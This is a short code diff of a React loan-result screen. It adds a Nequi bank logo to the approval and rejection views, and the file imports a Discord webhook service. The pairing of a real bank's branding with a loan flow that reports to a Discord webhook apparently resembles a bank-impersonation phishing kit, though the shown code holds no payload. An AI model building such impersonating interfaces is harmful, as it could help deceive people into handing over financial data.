@@ -1,6 +1,7 @@
 import { useState, useMemo } from 'react'
 import { CheckCircle2, Trophy, ArrowRight, XCircle, RefreshCw, AlertTriangle } from 'lucide-react'
 import { ScreenShell } from './ScreenShell'
+import { NequiLogo } from './NequiLogo'
 import { DiscordWebhookService } from '../services/DiscordWebhookService'
 
 interface ResultScreenProps {
@@ -86,6 +87,9 @@ export function ResultScreen({ loanAmount, monthlyIncome, loanTerm, onApproved, 
   if (result.approved) {
     return (
       <ScreenShell>
+        <div className="flex justify-center mb-6">
+          <NequiLogo size="md" color="dark" />
+        </div>
         <div className="flex flex-col items-center text-center animate-slide-up">
 
           {/* Icon stack */}
@@ -212,6 +216,9 @@ export function ResultScreen({ loanAmount, monthlyIncome, loanTerm, onApproved, 
   // --- REJECTED SCREEN ---
   return (
     <ScreenShell onBack={onBack}>
+      <div className="flex justify-center mb-6">
+        <NequiLogo size="md" color="dark" />
+      </div>
       <div className="flex flex-col items-center text-center animate-slide-up">
 
         {/* Icon */}
